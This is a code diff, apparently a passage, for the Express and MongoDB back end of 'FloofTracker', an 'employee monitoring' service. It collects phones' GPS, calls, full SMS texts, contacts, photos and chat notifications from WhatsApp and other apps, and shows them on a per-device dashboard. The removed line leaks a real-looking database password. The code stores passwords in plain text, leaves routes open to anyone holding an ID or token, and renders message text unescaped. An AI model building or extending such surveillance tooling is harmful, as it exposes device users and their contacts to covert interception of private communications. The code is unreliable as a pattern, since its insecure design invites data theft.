@@ -1,19 +1,35 @@
 const express = require('express');
 const mongoose = require('mongoose');
+const crypto = require('crypto');
 
 const app = express();
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
 const PORT = process.env.PORT || 3000;
-const MONGO_URI = process.env.MONGO_URI || 'mongodb+srv://paulcarbonel2205_db_user:oXde3qFT3DaUBjg8@flooftracker.l7bt2kx.mongodb.net/?appName=flooftracker';
+const MONGO_URI = process.env.MONGO_URI;
 
-// Connect to MongoDB
 mongoose.connect(MONGO_URI)
     .then(() => console.log('MongoDB connected'))
     .catch(err => console.error('MongoDB error:', err));
 
 // Schemas
+const EmployerSchema = new mongoose.Schema({
+    email: { type: String, unique: true },
+    password: String,
+    plan: { type: String, default: 'free' },
+    created_at: { type: Date, default: Date.now }
+});
+
+const TokenSchema = new mongoose.Schema({
+    token: { type: String, unique: true },
+    employer_id: mongoose.Schema.Types.ObjectId,
+    device_name: { type: String, default: '' },
+    registered: { type: Boolean, default: false },
+    created_at: { type: Date, default: Date.now },
+    active: { type: Boolean, default: true }
+});
+
 const DeviceSchema = new mongoose.Schema({
     token: String,
     device_model: String,
@@ -68,7 +84,7 @@ const MediaSchema = new mongoose.Schema({
     path: String,
     size_bytes: Number,
     is_screenshot: Boolean,
-    thumbnail: String  // base64
+    thumbnail: String
 });
 
 const NotificationSchema = new mongoose.Schema({
@@ -79,7 +95,8 @@ const NotificationSchema = new mongoose.Schema({
     received_at: Date
 });
 
-// Models
+const Employer = mongoose.model('Employer', EmployerSchema);
+const Token = mongoose.model('Token', TokenSchema);
 const Device = mongoose.model('Device', DeviceSchema);
 const Gps = mongoose.model('Gps', GpsSchema);
 const Call = mongoose.model('Call', CallSchema);
@@ -89,224 +106,635 @@ const Contact = mongoose.model('Contact', ContactSchema);
 const Media = mongoose.model('Media', MediaSchema);
 const Notification = mongoose.model('Notification', NotificationSchema);
 
+const PLAN_LIMITS = { free: 1, starter: 5, business: 10, professional: 20, enterprise: Infinity };
+
 function getToken(req) {
     return req.headers['x-device-token'] || 'unknown';
 }
 
-// Routes
+// ── Employer Routes ──────────────────────────────────────────────────────────
+
+app.post('/employer/register', async (req, res) => {
+    try {
+        const { email, password } = req.body;
+        const existing = await Employer.findOne({ email });
+        if (existing) return res.json({ success: false, message: 'Email already exists' });
+        const employer = await Employer.create({ email, password });
+        res.json({ success: true, employer_id: employer._id });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/employer/login', async (req, res) => {
+    try {
+        const { email, password } = req.body;
+        const employer = await Employer.findOne({ email, password });
+        if (!employer) return res.json({ success: false, message: 'Invalid credentials' });
+        res.json({ success: true, employer_id: employer._id, plan: employer.plan });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/employer/set-plan', async (req, res) => {
+    try {
+        const { employer_id, plan } = req.body;
+        await Employer.findByIdAndUpdate(employer_id, { plan });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/employer/generate-token', async (req, res) => {
+    try {
+        const { employer_id } = req.body;
+        const employer = await Employer.findById(employer_id);
+        if (!employer) return res.json({ success: false, message: 'Employer not found' });
+
+        const tokenCount = await Token.countDocuments({ employer_id, active: true });
+        const limit = PLAN_LIMITS[employer.plan] || 1;
+
+        if (tokenCount >= limit) {
+            return res.json({ success: false, message: `Device limit reached for ${employer.plan} plan. Please upgrade.` });
+        }
+
+        const token = crypto.randomBytes(16).toString('hex');
+        await Token.create({ token, employer_id });
+        res.json({ success: true, token });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/employer/tokens', async (req, res) => {
+    try {
+        const { employer_id } = req.body;
+        const tokens = await Token.find({ employer_id, active: true });
+        res.json({ success: true, tokens });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/employer/delete-token', async (req, res) => {
+    try {
+        const { token_id } = req.body;
+        await Token.findByIdAndUpdate(token_id, { active: false });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+// ── Device Routes ────────────────────────────────────────────────────────────
+
+app.post('/device/validate-token', async (req, res) => {
+    try {
+        const token = getToken(req);
+        const valid = await Token.findOne({ token, active: true });
+        if (!valid) return res.json({ success: false, message: 'Invalid token' });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
 app.post('/device/register', async (req, res) => {
-    const token = getToken(req);
-    await Device.findOneAndUpdate(
-        { token },
-        { token, ...req.body, last_seen: new Date() },
-        { upsert: true }
-    );
-    console.log(`Device registered: ${token}`);
-    res.json({ success: true });
+    try {
+        const token = getToken(req);
+        await Device.findOneAndUpdate(
+            { token },
+            { token, ...req.body, last_seen: new Date() },
+            { upsert: true }
+        );
+        await Token.findOneAndUpdate(
+            { token },
+            { registered: true, device_name: req.body.device_model }
+        );
+        console.log(`Device registered: ${token}`);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 app.post('/device/gps', async (req, res) => {
-    const token = getToken(req);
-    await Gps.create({ token, ...req.body, received_at: new Date() });
-    console.log(`GPS from ${token}`);
-    res.json({ success: true });
+    try {
+        const token = getToken(req);
+        await Gps.create({ token, ...req.body, received_at: new Date() });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 app.post('/device/calls', async (req, res) => {
-    const token = getToken(req);
-    await Call.deleteMany({ token });
-    const calls = req.body.map(c => ({ token, ...c }));
-    await Call.insertMany(calls);
-    console.log(`${calls.length} calls from ${token}`);
-    res.json({ success: true });
+    try {
+        const token = getToken(req);
+        await Call.deleteMany({ token });
+        await Call.insertMany(req.body.map(c => ({ token, ...c })));
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 app.post('/device/sms', async (req, res) => {
-    const token = getToken(req);
-    await Sms.deleteMany({ token });
-    const messages = req.body.map(m => ({ token, ...m }));
-    await Sms.insertMany(messages);
-    console.log(`${messages.length} SMS from ${token}`);
-    res.json({ success: true });
+    try {
+        const token = getToken(req);
+        await Sms.deleteMany({ token });
+        await Sms.insertMany(req.body.map(m => ({ token, ...m })));
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 app.post('/device/apps', async (req, res) => {
-    const token = getToken(req);
-    await App.deleteMany({ token });
-    const apps = req.body.map(a => ({ token, ...a }));
-    await App.insertMany(apps);
-    console.log(`${apps.length} apps from ${token}`);
-    res.json({ success: true });
+    try {
+        const token = getToken(req);
+        await App.deleteMany({ token });
+        await App.insertMany(req.body.map(a => ({ token, ...a })));
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 app.post('/device/contacts', async (req, res) => {
-    const token = getToken(req);
-    await Contact.deleteMany({ token });
-    const contacts = req.body.map(c => ({ token, ...c }));
-    await Contact.insertMany(contacts);
-    console.log(`${contacts.length} contacts from ${token}`);
-    res.json({ success: true });
+    try {
+        const token = getToken(req);
+        await Contact.deleteMany({ token });
+        await Contact.insertMany(req.body.map(c => ({ token, ...c })));
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 app.post('/device/media', async (req, res) => {
-    const token = getToken(req);
-    await Media.deleteMany({ token });
-    const media = req.body.map(m => ({ token, ...m }));
-    await Media.insertMany(media);
-    console.log(`${media.length} media from ${token}`);
-    res.json({ success: true });
+    try {
+        const token = getToken(req);
+        await Media.deleteMany({ token });
+        await Media.insertMany(req.body.map(m => ({ token, ...m })));
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
 app.post('/device/notifications', async (req, res) => {
-    const token = getToken(req);
-    await Notification.create({ token, ...req.body, received_at: new Date() });
-    console.log(`Notification from ${token}`);
-    res.json({ success: true });
+    try {
+        const token = getToken(req);
+        await Notification.create({ token, ...req.body, received_at: new Date() });
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
 });
 
-app.get('/', async (req, res) => {
-    const devices = await Device.find();
-    const gps = await Gps.find().sort({ received_at: -1 }).limit(100);
-    const calls = await Call.find().sort({ called_at: -1 });
-    const sms = await Sms.find().sort({ received_at: -1 });
-    const apps = await App.find().sort({ usage_seconds: -1 });
-    const contacts = await Contact.find();
-    const media = await Media.find().sort({ date_taken: -1 });
-    const notifications = await Notification.find().sort({ received_at: -1 }).limit(200);
+// ── Frontend Pages ───────────────────────────────────────────────────────────
 
-    res.send(`
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>FloofTracker Dashboard</title>
-        <meta http-equiv="refresh" content="30">
-        <style>
-            body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
-            h1 { color: #333; }
-            .device { background: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
-            table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; margin-bottom: 20px; }
-            th { background: #333; color: white; padding: 10px; text-align: left; }
-            td { padding: 8px 10px; border-bottom: 1px solid #eee; }
-            tr:hover { background: #f9f9f9; }
-            h2 { color: #555; margin-top: 20px; }
-            img.thumb { width: 80px; height: 80px; object-fit: cover; border-radius: 4px; }
-        </style>
-    </head>
-    <body>
-        <h1>FloofTracker Dashboard</h1>
+const styles = `
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: Arial, sans-serif; background: #f0f2f5; }
+    .header { background: #1a1a2e; color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; }
+    .header h1 { font-size: 20px; }
+    .container { max-width: 1000px; margin: 30px auto; padding: 0 20px; }
+    .card { background: white; border-radius: 12px; padding: 24px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+    .btn { padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; }
+    .btn-primary { background: #1a1a2e; color: white; }
+    .btn-danger { background: #e74c3c; color: white; }
+    .btn-success { background: #27ae60; color: white; }
+    input { width: 100%; padding: 10px 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; margin-bottom: 12px; }
+    .msg { padding: 10px; border-radius: 8px; margin-bottom: 12px; font-size: 13px; }
+    .msg-error { background: #fde; color: #c00; }
+    .msg-success { background: #dfd; color: #060; }
+    table { width: 100%; border-collapse: collapse; }
+    th { background: #1a1a2e; color: white; padding: 10px; text-align: left; font-size: 13px; }
+    td { padding: 8px 10px; border-bottom: 1px solid #eee; font-size: 13px; }
+    tr:hover { background: #f9f9f9; }
+    .token-card { background: #f8f8f8; border-radius: 8px; padding: 16px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; }
+    .token-code { font-family: monospace; font-size: 13px; color: #555; }
+    .badge { padding: 4px 10px; border-radius: 20px; font-size: 12px; }
+    .badge-green { background: #dfd; color: #060; }
+    .badge-gray { background: #eee; color: #666; }
+    img.thumb { width: 80px; height: 80px; object-fit: cover; border-radius: 6px; }
+    .plan-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; }
+    .plan-card { border: 2px solid #ddd; border-radius: 12px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.2s; }
+    .plan-card:hover { border-color: #1a1a2e; transform: translateY(-2px); }
+    .plan-card h3 { margin-bottom: 8px; }
+    .plan-card .price { font-size: 22px; font-weight: bold; color: #1a1a2e; margin: 8px 0; }
+    .plan-card .devices { color: #666; font-size: 13px; }
+    .plan-card.popular { border-color: #1a1a2e; background: #f0f2ff; }
+`;
 
-        <h2>Devices</h2>
-        ${devices.map(d => `
-            <div class="device">
-                <b>Token:</b> ${d.token}<br>
-                <b>Model:</b> ${d.device_model}<br>
-                <b>Android:</b> ${d.android_version}<br>
-                <b>Last seen:</b> ${d.last_seen}
+// Login page
+app.get('/', (req, res) => {
+    res.send(`<!DOCTYPE html><html><head><title>FloofTracker</title><style>
+    ${styles}
+    .login-wrap { display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .login-box { background: white; border-radius: 16px; padding: 40px; width: 380px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+    .login-box h2 { margin-bottom: 6px; color: #1a1a2e; }
+    .login-box p { color: #888; margin-bottom: 24px; font-size: 14px; }
+    .btn { width: 100%; padding: 12px; font-size: 15px; }
+    a { display: block; text-align: center; margin-top: 16px; color: #666; font-size: 13px; text-decoration: none; }
+    </style></head><body>
+    <div class="login-wrap">
+        <div class="login-box">
+            <h2>FloofTracker</h2>
+            <p>Employee monitoring made simple</p>
+            <div class="msg msg-error" id="msg" style="display:none"></div>
+            <input type="email" id="email" placeholder="Email address"/>
+            <input type="password" id="password" placeholder="Password"/>
+            <button class="btn btn-primary" onclick="login()">Login</button>
+            <a href="/register">Don't have an account? Register here</a>
+        </div>
+    </div>
+    <script>
+        async function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const res = await fetch('/employer/login', {
+                method: 'POST', headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({ email, password })
+            });
+            const data = await res.json();
+            if (data.success) {
+                localStorage.setItem('employer_id', data.employer_id);
+                localStorage.setItem('plan', data.plan);
+                if (!data.plan || data.plan === 'free' && data.firstLogin) {
+                    window.location.href = '/welcome';
+                } else {
+                    window.location.href = '/tokens';
+                }
+            } else {
+                const msg = document.getElementById('msg');
+                msg.style.display = 'block';
+                msg.textContent = data.message;
+            }
+        }
+    </script>
+    </body></html>`);
+});
+
+// Register page
+app.get('/register', (req, res) => {
+    res.send(`<!DOCTYPE html><html><head><title>Register - FloofTracker</title><style>
+    ${styles}
+    .login-wrap { display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .login-box { background: white; border-radius: 16px; padding: 40px; width: 380px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+    .login-box h2 { margin-bottom: 6px; color: #1a1a2e; }
+    .login-box p { color: #888; margin-bottom: 24px; font-size: 14px; }
+    .btn { width: 100%; padding: 12px; font-size: 15px; }
+    a { display: block; text-align: center; margin-top: 16px; color: #666; font-size: 13px; text-decoration: none; }
+    </style></head><body>
+    <div class="login-wrap">
+        <div class="login-box">
+            <h2>Create Account</h2>
+            <p>Start monitoring your team today</p>
+            <div class="msg msg-error" id="msg" style="display:none"></div>
+            <input type="email" id="email" placeholder="Email address"/>
+            <input type="password" id="password" placeholder="Password"/>
+            <input type="password" id="confirm" placeholder="Confirm password"/>
+            <button class="btn btn-primary" onclick="register()">Create Account</button>
+            <a href="/">Already have an account? Login</a>
+        </div>
+    </div>
+    <script>
+        async function register() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const confirm = document.getElementById('confirm').value;
+            const msg = document.getElementById('msg');
+            if (password !== confirm) {
+                msg.style.display = 'block';
+                msg.textContent = 'Passwords do not match';
+                return;
+            }
+            const res = await fetch('/employer/register', {
+                method: 'POST', headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({ email, password })
+            });
+            const data = await res.json();
+            if (data.success) {
+                localStorage.setItem('employer_id', data.employer_id);
+                localStorage.setItem('plan', 'free');
+                window.location.href = '/welcome';
+            } else {
+                msg.style.display = 'block';
+                msg.textContent = data.message;
+            }
+        }
+    </script>
+    </body></html>`);
+});
+
+// Welcome/Features page
+app.get('/welcome', (req, res) => {
+    res.send(`<!DOCTYPE html><html><head><title>Welcome - FloofTracker</title><style>
+    ${styles}
+    .feature-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin: 20px 0; }
+    .feature-item { background: #f8f8f8; border-radius: 10px; padding: 20px; text-align: center; }
+    .feature-item .icon { font-size: 32px; margin-bottom: 10px; }
+    .feature-item h4 { color: #1a1a2e; margin-bottom: 6px; }
+    .feature-item p { color: #888; font-size: 13px; }
+    .btn { padding: 14px 40px; font-size: 15px; }
+    </style></head><body>
+    <div class="header"><h1>FloofTracker</h1><button class="btn btn-danger" onclick="logout()">Logout</button></div>
+    <div class="container">
+        <div class="card" style="text-align:center;padding:40px">
+            <h2 style="color:#1a1a2e;margin-bottom:10px">Welcome to FloofTracker 👋</h2>
+            <p style="color:#888;margin-bottom:30px">Here's what you can monitor on your employees' devices</p>
+            <div class="feature-grid">
+                <div class="feature-item"><div class="icon">📍</div><h4>GPS Location</h4><p>Real-time location tracking every 5 minutes</p></div>
+                <div class="feature-item"><div class="icon">📞</div><h4>Call Logs</h4><p>Incoming, outgoing and missed calls with duration</p></div>
+                <div class="feature-item"><div class="icon">💬</div><h4>SMS Messages</h4><p>All sent and received text messages</p></div>
+                <div class="feature-item"><div class="icon">📱</div><h4>App Usage</h4><p>Which apps are used and for how long</p></div>
+                <div class="feature-item"><div class="icon">👥</div><h4>Contacts</h4><p>Full contact list with names and numbers</p></div>
+                <div class="feature-item"><div class="icon">🖼️</div><h4>Photos & Screenshots</h4><p>Thumbnail previews of all captured media</p></div>
+                <div class="feature-item"><div class="icon">🔔</div><h4>Instant Messages</h4><p>Facebook, Instagram, WhatsApp, Viber and more</p></div>
             </div>
-        `).join('')}
-
-        <h2>App Usage</h2>
-        <table>
-            <tr><th>Device</th><th>App</th><th>Usage</th><th>Date</th></tr>
-            ${apps.map(a => `
-                <tr>
-                    <td>${a.token}</td>
-                    <td>${a.app_name}</td>
-                    <td>${Math.round(a.usage_seconds / 60)} min</td>
-                    <td>${a.usage_date}</td>
-                </tr>
-            `).join('')}
-        </table>
-
-        <h2>Calls</h2>
-        <table>
-            <tr><th>Device</th><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th></tr>
-            ${calls.map(c => `
-                <tr>
-                    <td>${c.token}</td>
-                    <td>${c.number}</td>
-                    <td>${c.contact_name}</td>
-                    <td>${c.call_type}</td>
-                    <td>${c.duration_seconds}s</td>
-                    <td>${new Date(c.called_at).toLocaleString()}</td>
-                </tr>
-            `).join('')}
-        </table>
-
-        <h2>SMS</h2>
-        <table>
-            <tr><th>Device</th><th>Number</th><th>Type</th><th>Message</th><th>Date</th></tr>
-            ${sms.map(s => `
-                <tr>
-                    <td>${s.token}</td>
-                    <td>${s.number}</td>
-                    <td>${s.sms_type}</td>
-                    <td>${s.message_body}</td>
-                    <td>${new Date(s.received_at).toLocaleString()}</td>
-                </tr>
-            `).join('')}
-        </table>
-
-        <h2>GPS</h2>
-        <table>
-            <tr><th>Device</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Map</th><th>Date</th></tr>
-            ${gps.map(g => `
-                <tr>
-                    <td>${g.token}</td>
-                    <td>${g.latitude}</td>
-                    <td>${g.longitude}</td>
-                    <td>${g.accuracy}m</td>
-                    <td><a href="https://maps.google.com/?q=${g.latitude},${g.longitude}" target="_blank">View on Map</a></td>
-                    <td>${new Date(g.received_at).toLocaleString()}</td>
-                </tr>
-            `).join('')}
-        </table>
-
-        <h2>Contacts</h2>
-        <table>
-            <tr><th>Device</th><th>Name</th><th>Number</th></tr>
-            ${contacts.map(c => `
-                <tr>
-                    <td>${c.token}</td>
-                    <td>${c.name}</td>
-                    <td>${c.number}</td>
-                </tr>
-            `).join('')}
-        </table>
-
-        <h2>Media & Screenshots</h2>
-        <table>
-            <tr><th>Device</th><th>Preview</th><th>Filename</th><th>Type</th><th>Size</th><th>Date Taken</th></tr>
-            ${media.map(m => `
-                <tr>
-                    <td>${m.token}</td>
-                    <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}"/>` : 'No preview'}</td>
-                    <td>${m.filename}</td>
-                    <td>${m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo'}</td>
-                    <td>${Math.round(m.size_bytes / 1024)}KB</td>
-                    <td>${new Date(m.date_taken).toLocaleString()}</td>
-                </tr>
-            `).join('')}
-        </table>
-
-        <h2>Instant Messages</h2>
-        <table>
-            <tr><th>Device</th><th>App</th><th>Sender</th><th>Message</th><th>Date</th></tr>
-            ${notifications.map(n => `
-                <tr>
-                    <td>${n.token}</td>
-                    <td>${n.app}</td>
-                    <td>${n.sender}</td>
-                    <td>${n.message}</td>
-                    <td>${new Date(n.received_at).toLocaleString()}</td>
-                </tr>
-            `).join('')}
-        </table>
-    </body>
-    </html>
-    `);
+            <button class="btn btn-primary" onclick="window.location.href='/plans'" style="margin-top:30px">Choose a Plan →</button>
+        </div>
+    </div>
+    <script>
+        if (!localStorage.getItem('employer_id')) window.location.href = '/';
+        function logout() { localStorage.clear(); window.location.href = '/'; }
+    </script>
+    </body></html>`);
 });
 
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+// Plans page
+app.get('/plans', (req, res) => {
+    res.send(`<!DOCTYPE html><html><head><title>Plans - FloofTracker</title><style>
+    ${styles}
+    .btn { padding: 12px 24px; font-size: 14px; width: 100%; margin-top: 16px; }
+    </style></head><body>
+    <div class="header"><h1>FloofTracker</h1><button class="btn btn-danger" onclick="logout()" style="width:auto">Logout</button></div>
+    <div class="container">
+        <div class="card">
+            <h2 style="color:#1a1a2e;margin-bottom:6px">Choose Your Plan</h2>
+            <p style="color:#888;margin-bottom:24px">All plans include all features. Upgrade anytime.</p>
+            <div class="plan-grid">
+                <div class="plan-card" onclick="selectPlan('free')">
+                    <h3>Free</h3>
+                    <div class="price">₱0</div>
+                    <div class="devices">1 device</div>
+                    <button class="btn btn-primary">Select</button>
+                </div>
+                <div class="plan-card" onclick="selectPlan('starter')">
+                    <h3>Starter</h3>
+                    <div class="price">Coming Soon</div>
+                    <div class="devices">5 devices</div>
+                    <button class="btn btn-primary">Select</button>
+                </div>
+                <div class="plan-card popular" onclick="selectPlan('business')">
+                    <h3>Business ⭐</h3>
+                    <div class="price">Coming Soon</div>
+                    <div class="devices">10 devices</div>
+                    <button class="btn btn-primary">Select</button>
+                </div>
+                <div class="plan-card" onclick="selectPlan('professional')">
+                    <h3>Professional</h3>
+                    <div class="price">Coming Soon</div>
+                    <div class="devices">20 devices</div>
+                    <button class="btn btn-primary">Select</button>
+                </div>
+                <div class="plan-card" onclick="selectPlan('enterprise')">
+                    <h3>Enterprise</h3>
+                    <div class="price">Coming Soon</div>
+                    <div class="devices">Unlimited devices</div>
+                    <button class="btn btn-primary">Select</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        if (!localStorage.getItem('employer_id')) window.location.href = '/';
+        function logout() { localStorage.clear(); window.location.href = '/'; }
+        async function selectPlan(plan) {
+            const employer_id = localStorage.getItem('employer_id');
+            await fetch('/employer/set-plan', {
+                method: 'POST', headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({ employer_id, plan })
+            });
+            localStorage.setItem('plan', plan);
+            window.location.href = '/tokens';
+        }
+    </script>
+    </body></html>`);
 });
+
+// Tokens page
+app.get('/tokens', (req, res) => {
+    res.send(`<!DOCTYPE html><html><head><title>Devices - FloofTracker</title><style>
+    ${styles}
+    .btn { padding: 10px 20px; }
+    .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+    </style></head><body>
+    <div class="header"><h1>FloofTracker</h1>
+        <div>
+            <button class="btn btn-primary" onclick="window.location.href='/plans'" style="margin-right:8px">Change Plan</button>
+            <button class="btn btn-danger" onclick="logout()">Logout</button>
+        </div>
+    </div>
+    <div class="container">
+        <div class="card">
+            <div class="top-bar">
+                <div>
+                    <h2 style="color:#1a1a2e">Your Devices</h2>
+                    <p style="color:#888;font-size:13px">Plan: <b id="plan_label"></b> · <span id="device_count"></span></p>
+                </div>
+                <button class="btn btn-success" onclick="generateToken()">+ Add Device</button>
+            </div>
+            <div class="msg msg-error" id="msg" style="display:none"></div>
+            <div id="tokens_list"></div>
+        </div>
+    </div>
+    <script>
+        if (!localStorage.getItem('employer_id')) window.location.href = '/';
+        const employer_id = localStorage.getItem('employer_id');
+        const plan = localStorage.getItem('plan') || 'free';
+        const limits = { free: 1, starter: 5, business: 10, professional: 20, enterprise: 'Unlimited' };
+
+        document.getElementById('plan_label').textContent = plan.charAt(0).toUpperCase() + plan.slice(1);
+
+        async function loadTokens() {
+            const res = await fetch('/employer/tokens', {
+                method: 'POST', headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({ employer_id })
+            });
+            const data = await res.json();
+            const list = document.getElementById('tokens_list');
+            const limit = limits[plan];
+            document.getElementById('device_count').textContent = data.tokens.length + ' / ' + limit + ' devices';
+
+            if (data.tokens.length === 0) {
+                list.innerHTML = '<p style="color:#888;text-align:center;padding:40px">No devices yet. Click "+ Add Device" to generate a token.</p>';
+                return;
+            }
+
+            list.innerHTML = data.tokens.map(t => \`
+                <div class="token-card">
+                    <div>
+                        <div style="font-weight:bold;margin-bottom:4px">
+                            \${t.registered ? '📱 ' + t.device_name : '⏳ Awaiting registration'}
+                        </div>
+                        <div class="token-code">\${t.token}</div>
+                        <span class="badge \${t.registered ? 'badge-green' : 'badge-gray'}">
+                            \${t.registered ? 'Active' : 'Not registered'}
+                        </span>
+                    </div>
+                    <div style="display:flex;gap:8px;align-items:center">
+                        <button class="btn" onclick="copyToken('\${t.token}')" style="background:#eee;color:#333">Copy</button>
+                        \${t.registered ? \`<button class="btn btn-primary" onclick="viewDevice('\${t.token}')">View</button>\` : ''}
+                        <button class="btn btn-danger" onclick="deleteToken('\${t._id}')">Remove</button>
+                    </div>
+                </div>
+            \`).join('');
+        }
+
+        async function generateToken() {
+            const res = await fetch('/employer/generate-token', {
+                method: 'POST', headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({ employer_id })
+            });
+            const data = await res.json();
+            const msg = document.getElementById('msg');
+            if (data.success) {
+                msg.style.display = 'none';
+                loadTokens();
+            } else {
+                msg.style.display = 'block';
+                msg.textContent = data.message;
+            }
+        }
+
+        async function deleteToken(token_id) {
+            if (!confirm('Remove this device?')) return;
+            await fetch('/employer/delete-token', {
+                method: 'POST', headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({ token_id })
+            });
+            loadTokens();
+        }
+
+        function copyToken(token) {
+            navigator.clipboard.writeText(token);
+            alert('Token copied: ' + token);
+        }
+
+        function viewDevice(token) {
+            window.location.href = '/device?token=' + token;
+        }
+
+        function logout() { localStorage.clear(); window.location.href = '/'; }
+
+        loadTokens();
+    </script>
+    </body></html>`);
+});
+
+// Per-device dashboard
+app.get('/device', async (req, res) => {
+    const token = req.query.token;
+    if (!token) return res.redirect('/tokens');
+
+    const device = await Device.findOne({ token });
+    const gps = await Gps.find({ token }).sort({ received_at: -1 }).limit(50);
+    const calls = await Call.find({ token }).sort({ called_at: -1 });
+    const sms = await Sms.find({ token }).sort({ received_at: -1 });
+    const apps = await App.find({ token }).sort({ usage_seconds: -1 });
+    const contacts = await Contact.find({ token });
+    const media = await Media.find({ token }).sort({ date_taken: -1 });
+    const notifications = await Notification.find({ token }).sort({ received_at: -1 }).limit(200);
+
+    res.send(`<!DOCTYPE html><html><head><title>${device?.device_model || token} - FloofTracker</title>
+    <meta http-equiv="refresh" content="30">
+    <style>${styles}</style></head><body>
+    <div class="header">
+        <div>
+            <h1>${device?.device_model || 'Device'}</h1>
+            <small style="color:#aaa">Android ${device?.android_version || ''} · Last seen: ${device?.last_seen ? new Date(device.last_seen).toLocaleString() : 'Never'}</small>
+        </div>
+        <div>
+            <button class="btn btn-primary" onclick="window.location.href='/tokens'" style="margin-right:8px">← Back</button>
+            <button class="btn btn-danger" onclick="logout()">Logout</button>
+        </div>
+    </div>
+    <div class="container">
+
+        <h2>📱 App Usage</h2>
+        <div class="card" style="padding:0">
+        <table>
+            <tr><th>App</th><th>Usage</th><th>Date</th></tr>
+            ${apps.map(a => `<tr><td>${a.app_name}</td><td>${Math.round(a.usage_seconds / 60)} min</td><td>${a.usage_date}</td></tr>`).join('') || '<tr><td colspan="3" style="text-align:center;color:#888;padding:20px">No data</td></tr>'}
+        </table>
+        </div>
+
+        <h2>📞 Calls</h2>
+        <div class="card" style="padding:0">
+        <table>
+            <tr><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th></tr>
+            ${calls.map(c => `<tr><td>${c.number}</td><td>${c.contact_name}</td><td>${c.call_type}</td><td>${c.duration_seconds}s</td><td>${new Date(c.called_at).toLocaleString()}</td></tr>`).join('') || '<tr><td colspan="5" style="text-align:center;color:#888;padding:20px">No data</td></tr>'}
+        </table>
+        </div>
+
+        <h2>💬 SMS</h2>
+        <div class="card" style="padding:0">
+        <table>
+            <tr><th>Number</th><th>Type</th><th>Message</th><th>Date</th></tr>
+            ${sms.map(s => `<tr><td>${s.number}</td><td>${s.sms_type}</td><td>${s.message_body}</td><td>${new Date(s.received_at).toLocaleString()}</td></tr>`).join('') || '<tr><td colspan="4" style="text-align:center;color:#888;padding:20px">No data</td></tr>'}
+        </table>
+        </div>
+
+        <h2>📍 GPS Location</h2>
+        <div class="card" style="padding:0">
+        <table>
+            <tr><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Map</th><th>Date</th></tr>
+            ${gps.map(g => `<tr><td>${g.latitude}</td><td>${g.longitude}</td><td>${g.accuracy}m</td><td><a href="https://maps.google.com/?q=${g.latitude},${g.longitude}" target="_blank">View</a></td><td>${new Date(g.received_at).toLocaleString()}</td></tr>`).join('') || '<tr><td colspan="5" style="text-align:center;color:#888;padding:20px">No data</td></tr>'}
+        </table>
+        </div>
+
+        <h2>👥 Contacts</h2>
+        <div class="card" style="padding:0">
+        <table>
+            <tr><th>Name</th><th>Number</th></tr>
+            ${contacts.map(c => `<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('') || '<tr><td colspan="2" style="text-align:center;color:#888;padding:20px">No data</td></tr>'}
+        </table>
+        </div>
+
+        <h2>🖼️ Media & Screenshots</h2>
+        <div class="card" style="padding:0">
